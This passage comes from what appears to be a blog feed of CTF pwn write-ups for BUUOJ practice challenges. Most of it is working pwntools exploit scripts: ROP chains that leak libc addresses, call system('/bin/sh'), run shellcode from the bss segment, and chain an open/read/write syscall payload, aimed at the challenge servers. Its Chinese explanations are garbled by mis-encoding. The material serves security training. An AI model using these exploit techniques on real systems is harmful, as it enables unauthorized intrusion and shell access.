</span><br>elf = ELF(<span class="hljs-string">&#x27;./ciscn_2019_c_1&#x27;</span>)<br><br>ret=<span class="hljs-number">0x4006b9</span><br>rdi=<span class="hljs-number">0x400c83</span><br>main=elf.sym[<span class="hljs-string">&#x27;main&#x27;</span>]<br>puts_plt=elf.plt[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>puts_got=elf.got[<span class="hljs-string">&#x27;puts&#x27;</span>]<br><br><span class="hljs-comment">#ç¬¬ä¸€æ¬¡æ”»å‡»ç»•è¿‡å‡½æ•°</span><br>p.sendlineafter(<span class="hljs-string">b&#x27;Input your choice!\n&#x27;</span>,<span class="hljs-string">b&#x27;1&#x27;</span>)<br>payload=<span class="hljs-string">b&#x27;\0&#x27;</span>+<span class="hljs-string">b&#x27;a&#x27;</span>*(<span class="hljs-number">0x50</span>-<span class="hljs-number">1</span>+<span class="hljs-number">8</span>)+p64(rdi)+p64(puts_got)+p64(puts_plt)+p64(main)<br>p.sendlineafter(<span class="hljs-string">b&#x27;Input your Plaintext to be encrypted\n&#x27;</span>,payload)<br> <br> <br> <br>p.recvline()<span class="hljs-comment">#æ¥æ”¶å­—ç¬¦ä¸²Ciphertext</span><br>p.recvline()    <span class="hljs-comment">#åŠ å¯†åçš„å¯†æ–‡</span><br><span class="hljs-comment">#è¿™é‡Œæ³¨æ„éœ€è¦æ¥æ”¶2æ¬¡</span><br> <br>puts_addr=u64(p.recvuntil(<span class="hljs-string">b&#x27;\n&#x27;</span>)[:-<span class="hljs-number">1</span>].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\0&#x27;</span>))  <span class="hljs-comment">#å¾—åˆ° puts å‡½æ•° çš„åœ°å€</span><br><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(puts_addr))<br><br>libc=LibcSearcher(<span class="hljs-string">&#x27;puts&#x27;</span>,puts_addr) <span class="hljs-comment">#è·å–libcçš„ç‰ˆæœ¬</span><br>offset=puts_addr-libc.dump(<span class="hljs-string">&#x27;puts&#x27;</span>) <span class="hljs-comment">#è®¡ç®—åç§»é‡</span><br>binsh=offset+libc.dump(<span class="hljs-string">&#x27;str_bin_sh&#x27;</span>) <span class="hljs-comment">#è®¡ç®—å­—ç¬¦ä¸²&quot;/bin/sh&quot;çš„åœ°å€</span><br>system=offset+libc.dump(<span class="hljs-string">&#x27;system&#x27;</span>) <span class="hljs-comment">#è®¡ç®—å‡½æ•°systemçš„åœ°å€</span><br> <br><span class="hljs-comment">#ç¬¬äºŒæ¬¡æ”»å‡»getshell</span><br> <br>p.sendlineafter(<span class="hljs-string">b&#x27;Input your choice!\n&#x27;</span>,<span class="hljs-string">b&#x27;1&#x27;</span>)     <span class="hljs-comment">#   å†ä¸€æ¬¡æ‰§è¡Œ ä¸€éæµç¨‹</span><br>payload=<span class="hljs-string">b&#x27;\0&#x27;</span>+<span class="hljs-string">b&#x27;a&#x27;</span>*(<span class="hljs-number">0x50</span>-<span class="hljs-number">1</span>+<span class="hljs-number">8</span>)+p64(ret)+p64(rdi)+p64(binsh)+p64(system)<br>p.sendlineafter(<span class="hljs-string">b&#x27;Input your Plaintext to be encrypted\n&#x27;</span>,payload)<br>p.interactive()<br><br><br><br><span class="hljs-comment"># ubuntu18ç‰ˆæœ¬ä»¥ä¸Šè°ƒç”¨64ä½ç¨‹åºä¸­çš„systemå‡½æ•°çš„æ ˆå¯¹é½é—®é¢˜</span><br><span class="hljs-comment"># https://www.cnblogs.com/ZIKH26/articles/15996874.html</span><br></code></pre></td></tr></table></figure><h3 id="é¢˜ç›®2"><a href="#é¢˜ç›®2" class="headerlink" title="é¢˜ç›®2"></a>é¢˜ç›®2</h3><p><a href="https://buuoj.cn/challenges#bjdctf_2020_babyrop">https://buuoj.cn/challenges#bjdctf_2020_babyrop</a></p><p>éå¸¸åŸºæœ¬çš„ä¸€é“åˆ©ç”¨putså‡½æ•°æ„é€ ropé“¾æ³„éœ²libcåŸºå€çš„é¢˜ç›®</p><p><strong>Exp</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br><br>p = remote(<span class="hljs-string">&quot;node4.buuoj.cn&quot;</span>,<span class="hljs-number">25323</span>)<br><br>elf = ELF(<span class="hljs-string">&#x27;./bjdctf_2020_babyrop&#x27;</span>)<br><br>main = elf.sym[<span class="hljs-string">&#x27;main&#x27;</span>]<br>poprdi_ret = <span class="hljs-number">0x400733</span><br><br>puts_got = elf.got[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>puts_plt = elf.plt[<span class="hljs-string">&#x27;puts&#x27;</span>]<br><br>s = p.recv()<br><span class="hljs-built_in">print</span>(s)<br><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">40</span> + p64(poprdi_ret) + p64(puts_got) + p64(puts_plt) + p64(main)<br><br>p.sendline(payload)<br><br>s = p.recv()<br><br>puts_addr = u64(s[:<span class="hljs-number">6</span>].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(puts_addr))<br><br>libc =LibcSearcher(<span class="hljs-string">&#x27;puts&#x27;</span>,puts_addr)<br>offset = puts_addr - libc.dump(<span class="hljs-string">&#x27;puts&#x27;</span>)<br>binsh = offset + libc.dump(<span class="hljs-string">&#x27;str_bin_sh&#x27;</span>)<br>system = offset + libc.dump(<span class="hljs-string">&#x27;system&#x27;</span>)<br><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">40</span> + p64(poprdi_ret) + p64(binsh) + p64(system)<br><br>p.sendline(payload)<br><br>p.interactive()<br></code></pre></td></tr></table></figure><h3 id="é¢˜ç›®3"><a href="#é¢˜ç›®3" class="headerlink" title="é¢˜ç›®3"></a>é¢˜ç›®3</h3><p><a href="https://buuoj.cn/challenges#get_started_3dsctf_2016">https://buuoj.cn/challenges#get_started_3dsctf_2016</a></p><p>ä¸€é“ååˆ†ç®€å•çš„æ ˆæº¢å‡ºï¼Œå°†mainçš„è¿”å›åœ°å€ç§»äº¤ç»™è‡ªå¸¦çš„get_flagå‡½æ•°</p><p>æŠŠè¿™é“é¢˜åˆ—å‡ºæ¥çš„åŸå› åœ¨äºï¼Œç¨‹åºæ²¡æœ‰å¼€å¯æ ‡å‡†è¾“å…¥è¾“å‡ºï¼Œ</p><p>å¦‚æœå•çº¯æ‰§è¡Œå®Œget_flagä¸è®¾ç½®ä¸€ä¸ªæ­£ç¡®çš„è¿”å›åœ°å€ï¼Œè¿™ä¸ªå‡½æ•°é‡Œçš„è¾“å‡ºæ˜¾ç¤ºä¸å‡ºæ¥</p><p>ï¼ˆè¯¦ç»†åŸå› ç›®å‰ä¹Ÿä¸æ˜¯å¾ˆæ¸…æ¥šï¼‰</p><p><strong>Exp</strong></p><p>é’ˆå¯¹ä¸Šè¿°é—®é¢˜ï¼Œé€‰æ‹©exitå‡½æ•°ä½œä¸ºget_flagçš„è¿”å›åœ°å€ï¼ˆä¸èƒ½æ”¾ä¸€ä¸ªç©ºç€çš„p32(0)è¿›å»ï¼‰</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br><br><span class="hljs-comment">#p = remote(&quot;node4.buuoj.cn&quot;,27230)</span><br>p = process(<span class="hljs-string">&#x27;./get_started_3dsctf_2016&#x27;</span>)<br><br>elf = ELF(<span class="hljs-string">&#x27;./get_started_3dsctf_2016&#x27;</span>)<br><br>get_flag = <span class="hljs-number">0x80489A0</span><br>param1 = <span class="hljs-number">0x308CD64F</span><br>param2 = <span class="hljs-number">0x195719D1</span><br><br>sleep(<span class="hljs-number">0.1</span>)<br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">56</span> + p32(get_flag) +p32(<span class="hljs-number">0x0804E6A0</span>) + p32(param1) + p32(param2)<br><br>p.sendline(payload)<br><br>p.interactive()<br><br></code></pre></td></tr></table></figure><h3 id="é¢˜ç›®4"><a href="#é¢˜ç›®4" class="headerlink" title="é¢˜ç›®4"></a>é¢˜ç›®4</h3><p><a href="https://buuoj.cn/challenges#[HarekazeCTF2019]baby_rop">https://buuoj.cn/challenges#[HarekazeCTF2019]baby_rop</a></p><p>ä»ç»™å®šlibcè·å–è·å–åŸºå€</p><p>ç”±äºç»™äº†libcç‰ˆæœ¬ï¼Œæ­¤expå±•ç¤ºä½¿ç”¨æŒ‡å®šçš„libcæ–‡ä»¶è·å–åç§»çš„æ–¹æ³•</p><p>ä¸ç”¨ç»™çš„libcæ–‡ä»¶çš„è§ä¸‹ä¸€é“é¢˜ï¼Œharekaze2019çš„babyrop2</p><p><strong>Exp</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br><span class="hljs-comment"># p = process(&#x27;./pwn&#x27;)</span><br>p = remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">28818</span>)<br>e = ELF(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br><br><span class="hljs-comment">#payload 1</span><br>payload1 = <span class="hljs-string">&#x27;\x00&#x27;</span> + <span class="hljs-string">&#x27;\xff&#x27;</span> * <span class="hljs-number">7</span><br>p.sendline(payload1)<br>p.recvuntil(<span class="hljs-string">&quot;Correct\n&quot;</span>)<br><br><span class="hljs-comment">#payload 2</span><br>payload2 = (<span class="hljs-number">231</span> + <span class="hljs-number">4</span>) * <span class="hljs-string">b&#x27;a&#x27;</span> + p32(e.plt[<span class="hljs-string">&#x27;write&#x27;</span>]) + p32(<span class="hljs-number">0x08048825</span>) +p32(<span class="hljs-number">1</span>) + p32(e.got[<span class="hljs-string">&#x27;write&#x27;</span>]) + p32(<span class="hljs-number">4</span>)<br><br>p.sendline(payload2)<br><br><span class="hljs-comment"># leak addr</span><br>write_got = u32(p.recv(<span class="hljs-number">4</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(write_got))<br><br><span class="hljs-comment">#payload 3</span><br>libc = ELF(<span class="hljs-string">&quot;./libc-2.23.so&quot;</span>)<br>libc.address =  write_got - libc.sym[<span class="hljs-string">&#x27;write&#x27;</span>]<br>system = libc.sym[<span class="hljs-string">&quot;system&quot;</span>]<br>binsh = <span class="hljs-built_in">next</span>(libc.search(<span class="hljs-string">b&quot;/bin/sh&quot;</span>))<br>p.sendline(payload1)<br>payload3 =  (<span class="hljs-number">231</span> + <span class="hljs-number">4</span>) * <span class="hljs-string">b&#x27;a&#x27;</span> + p32(system) + p32(<span class="hljs-number">0xdeadbeef</span>) + p32(binsh)<br>p.sendline(payload3)<br><br>p.interactive()<br></code></pre></td></tr></table></figure><h3 id="é¢˜ç›®5"><a href="#é¢˜ç›®5" class="headerlink" title="é¢˜ç›®5"></a>é¢˜ç›®5</h3><p><strong>é¢˜ç›®</strong></p><p><a href="https://buuoj.cn/challenges#[HarekazeCTF2019]baby_rop2">https://buuoj.cn/challenges#[HarekazeCTF2019]baby_rop2</a></p><p>å’Œå‰é¢ä¸€ä¸ªé¢˜ç›®åŒæ ·ï¼Œæ˜¯ä¸€ä¸ªæ„é€ ropé“¾çš„æ ˆæº¢å‡ºï¼Œè™½ç„¶é¢˜ç›®ä¹Ÿç»™äº†libcæ–‡ä»¶ï¼Œä½†æ˜¯ä¸æ˜¯å¿…è¦çš„</p><p><strong>æ–¹æ³•</strong></p><p>è¿™é“é¢˜ç›®çš„å·®åˆ«æˆ–å€¼å¾—æ³¨æ„çš„åœ°æ–¹åœ¨äº</p><ol><li><p>ä¸å†æ˜¯ç”¨putså‡½æ•°ï¼ˆåªéœ€è¦ä¸€ä¸ªå‚æ•°ï¼‰ï¼Œè¿™é“é¢˜ç›®ä¸­å¯ä»¥ç”¨printfæ„é€ ropé“¾</p><p>printfæœ‰ä¸¤ä¸ªå‚æ•°ï¼Œé™¤äº†rdiå¯„å­˜å™¨ä¹‹å¤–ï¼Œè¿˜éœ€è¦rsiå¯„å­˜å™¨æ¥ä¼ é€’å‚æ•°ï¼Œä½†æ˜¯è¿™ä¸ªç¨‹åºé‡Œæ²¡æœ‰ç›´æ¥çš„<code>pop rsi, ret</code>çš„ä»£ç ï¼Œåªæœ‰ä¸€ä¸ª<code>pop rsi, pop r15, ret</code>ï¼Œå› æ­¤éœ€è¦å†é¢å¤–ç»™r15åœ¨æ ˆä¸Šç•™å‡ºä¸€ä¸ªç©ºé—´ã€‚è¯¦è§expä»£ç ã€‚</p></li><li><p>ç”¨readå‡½æ•°è¿›è¡ŒlibcåŸºåœ°å€æ³„éœ²ï¼Œè™½ç„¶ç†è®ºä¸Šç”¨printfä¹Ÿå¯ä»¥ï¼Œä½†æ˜¯æˆ‘ä¸çŸ¥é“ä¸ºä»€ä¹ˆæ²¡æœ‰æˆåŠŸï¼Œæˆ‘åœ¨ç½‘ä¸ŠæŸ¥çš„æ—¶å€™åˆ«äººä¹Ÿæœ‰è¿™ä¸ªé—®é¢˜</p></li></ol><p><strong>Exp</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br><br><span class="hljs-comment">#p = process(&#x27;./babyrop2&#x27;)</span><br>p = remote(<span class="hljs-string">&quot;node4.buuoj.cn&quot;</span>,<span class="hljs-number">29507</span>)<br><br>elf = ELF(<span class="hljs-string">&#x27;./babyrop2&#x27;</span>)<br><br>poprdi_ret = <span class="hljs-number">0x400733</span><br>poprsi_popr15_ret = <span class="hljs-number">0x400731</span><br>main = elf.sym[<span class="hljs-string">&#x27;main&#x27;</span>]<br>printf_plt = elf.plt[<span class="hljs-string">&#x27;printf&#x27;</span>]<br>printf_got = elf.got[<span class="hljs-string">&#x27;printf&#x27;</span>]<br><br>read_plt = elf.plt[<span class="hljs-string">&#x27;read&#x27;</span>]<br>read_got = elf.got[<span class="hljs-string">&#x27;read&#x27;</span>]<br><br>format_str = <span class="hljs-number">0x400790</span><br><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">40</span> + p64(poprdi_ret) + p64(format_str) + \<br>          p64(poprsi_popr15_ret) + p64(read_got) + p64(<span class="hljs-number">0</span>) + p64(printf_plt) + p64(main)<br><br>p.sendlineafter(<span class="hljs-string">&quot;What&#x27;s your name? &quot;</span>,payload)<br><br>read_addr = u64(p.recvuntil(<span class="hljs-string">b&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;read_addr:&#x27;</span> + <span class="hljs-built_in">hex</span>(read_addr))<br><br>libc = LibcSearcher(<span class="hljs-string">&#x27;read&#x27;</span>, read_addr)<br>offset = read_addr - libc.dump(<span class="hljs-string">&#x27;read&#x27;</span>)<br>binsh = offset + libc.dump(<span class="hljs-string">&#x27;str_bin_sh&#x27;</span>)<br>system = offset + libc.dump(<span class="hljs-string">&#x27;system&#x27;</span>)<br><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">40</span> + p64(poprdi_ret) + p64(binsh) + p64(system)<br><br>p.sendlineafter(<span class="hljs-string">&quot;What&#x27;s your name? &quot;</span>, payload)<br>p.interactive()<br></code></pre></td></tr></table></figure><h3 id="é¢˜ç›®6"><a href="#é¢˜ç›®6" class="headerlink" title="é¢˜ç›®6"></a>é¢˜ç›®6</h3><p><a href="https://buuoj.cn/challenges#ciscn_2019_n_5">https://buuoj.cn/challenges#ciscn_2019_n_5</a></p><p><img src="/img/ciscn_2019_n_5/1.jpg"></p><p>ä¾æ—§æ˜¯æ ˆæº¢å‡ºï¼Œå¯ä»¥æ„é€ ropï¼Œä¹Ÿå¯ä»¥ç›´æ¥ret2shellcodeï¼ˆæ²¡å¼€NXï¼‰</p><p>ç”±äºropå†™ä¹ æƒ¯äº†ï¼Œå…ˆåˆ—å‡ºropçš„åšæ³•</p><p><img src="/img/ciscn_2019_n_5/2.jpg"></p><p>ç¬¬ä¸€ä¸ªè¾“å…¥éšä¾¿å†™ï¼Œç¬¬äºŒä¸ªè¾“å…¥å¼€å§‹æº¢å‡º</p><p><img src="/img/ciscn_2019_n_5/3.jpg"></p><p>æº¢å‡º30+2+8 = 40ä¸ªå­—èŠ‚ï¼Œç”¨putsçš„gotè¡¨æ¥æ³„éœ²libcåŸºå€</p><p>å€¼å¾—æ³¨æ„çš„æ˜¯è¿”å›mainåç¬¬äºŒéæº¢å‡ºæ—¶éœ€è¦æ ˆå¯¹é½</p><p><strong>Exp1</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br><br><span class="hljs-comment">#p = process(&quot;./ciscn_2019_n_5&quot;)</span><br>p = remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">27829</span>)<br><br>e = ELF(<span class="hljs-string">&quot;./ciscn_2019_n_5&quot;</span>)<br><br>main = e.symbols[<span class="hljs-string">&quot;main&quot;</span>]<br>puts_got = e.got[<span class="hljs-string">&quot;puts&quot;</span>]<br>puts_plt = e.plt[<span class="hljs-string">&quot;puts&quot;</span>]<br><br>pop_rdi = <span class="hljs-number">0x400713</span><br>ret = <span class="hljs-number">0x4004c9</span><br><br>p.recvline()<br>p.sendline(<span class="hljs-string">b&#x27;aaaa&#x27;</span>)<br>p.recvline()<br><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">40</span> + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main)<br><br>p.sendlineafter(<span class="hljs-string">b&quot;What do you want to say to me?\n&quot;</span>, payload)<br><br>puts_addr =  u64(p.recvuntil(<span class="hljs-string">b&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(puts_addr))<br><br>libc = LibcSearcher(<span class="hljs-string">&#x27;puts&#x27;</span>, puts_addr)<br>offset = puts_addr - libc.dump(<span class="hljs-string">&#x27;puts&#x27;</span>)<br>system = offset + libc.dump(<span class="hljs-string">&#x27;system&#x27;</span>)<br>binsh = offset + libc.dump(<span class="hljs-string">&#x27;str_bin_sh&#x27;</span>)<br><br>p.recvline()<br>p.sendline(<span class="hljs-string">b&#x27;aaaa&#x27;</span>)<br>p.recvline()<br><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">40</span> + p64(ret) + p64(pop_rdi) + p64(binsh) + p64(system)<br>p.sendlineafter(<span class="hljs-string">b&quot;What do you want to say to me?\n&quot;</span>, payload)<br>p.interactive()<br></code></pre></td></tr></table></figure><p><strong>ret2shellcode</strong></p><p><img src="/img/ciscn_2019_n_5/4.jpg"></p><p>ç”±äºé¢˜ç›®ç»™äº†bssæ®µä¸Š100ä¸ªå­—èŠ‚çš„ç©ºé—´ï¼Œå¯ä»¥ç”¨æ¥å†™shellcode</p><p>éœ€è¦åœ¨æ³¨æ„çš„åŒ…æ‹¬context.archè®¾ç½®å¹³å°ç¯å¢ƒ</p><p>è€Œä¸”ç‰¹æ„çœ‹äº†ä¸€ä¸‹ <code>len(shellcode) </code>æ˜¯ 48 &lt; 100å­—èŠ‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br><br><span class="hljs-comment">#p = process(&quot;./ciscn_2019_n_5&quot;)</span><br>p = remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">27829</span>)<br><br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>shellcode = asm(shellcraft.sh())<br>name_addr = <span class="hljs-number">0x0601080</span><br>p.sendlineafter(<span class="hljs-string">&quot;tell me your name\n&quot;</span>,shellcode)<br>payload = <span class="hljs-string">b&#x27;a&#x27;</span> * (<span class="hljs-number">0x20</span> + <span class="hljs-number">0x8</span>) + p64(name_addr)<br>p.sendlineafter(<span class="hljs-string">b&quot;What do you want to say to me?\n&quot;</span>,payload)<br>p.interactive()<br></code></pre></td></tr></table></figure><h3 id="é¢˜ç›®7"><a href="#é¢˜ç›®7" class="headerlink" title="é¢˜ç›®7"></a>é¢˜ç›®7</h3><p>å‘ç°æ²¡æœ‰å†™è¿‡ret2syscallçš„é¢˜ç›®ï¼Œè®°å½•ä¸€ä¸‹æ–¹ä¾¿å¿˜äº†å†çœ‹</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python">payload = <span class="hljs-string">b&#x27;/flag\x00&#x27;</span>+<span class="hljs-string">b&#x27;a&#x27;</span>*(<span class="hljs-number">0x48</span>-<span class="hljs-number">6</span>) + p64(pop_rdi)+p64(buf)+p64(pop_rsi)+p64(<span class="hljs-number">0</span>)\<br>    + p64(pop_rdx) + p64(<span class="hljs-number">0</span>) \<br>    + p64(pop_rax)+p64(<span class="hljs-number">2</span>)+p64(syscall) + p64(pop_rdi) + p64(<span class="hljs-number">3</span>) +p64(pop_rsi) + p64(buf+<span class="hljs-number">0x10</span>) \<br>    +p64(pop_rdx)+p64(<span class="hljs-number">0x32</span>) +p64(pop_rax)+p64(<span class="hljs-number">0</span>)+p64(syscall)+ p64(pop_rdi) + p64(<span class="hljs-number">1</span>) + p64(pop_rsi) \<br>    + p64(buf+<span class="hljs-number">0x10</span>) + p64(pop_rdx) + p64(<span class="hljs-number">0x90</span>) + p64(pop_rax) + p64(<span class="hljs-number">1</span>) +p64(syscall)<br></code></pre></td></tr></table></figure><table><thead><tr><th align="left">%rax</th><th align="left">System call</th><th align="left">%rdi</th><th align="left">%rsi</th><th align="left">%rdx</th><th align="left">%rcx</th><th align="left">%r8</th><th align="left">%r9</th></tr></thead><tbody><tr><td align="left">0</td><td align="left">sys_read</td><td align="left">unsigned int fd</td><td align="left">char *buf</td><td align="left">size_t count</td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">1</td><td align="left">sys_write</td><td align="left">unsigned int fd</td><td align="left">const char *buf</td><td align="left">size_t count</td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">2</td><td align="left">sys_open</td><td align="left">const char *filename</td><td align="left">int flags</td><td align="left">int mode</td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">3</td><td align="left">sys_close</td><td align="left">unsigned int fd</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr></tbody></table>]]></content>
    
    
    <categories>
      
      <category>ctf-pwn</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf-pwn</tag>
      
      <tag>stack</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>GOTè¡¨å’ŒPLTè¡¨</title>
    <link href="/2022/11/16/ctf-pwn/got%E8%A1%A8%E5%92%8Cplt%E8%A1%A8/"/>
    <url>/2022/11/16/ctf-pwn/got%E8%A1%A8%E5%92%8Cplt%E8%A1%A8/</url>
    
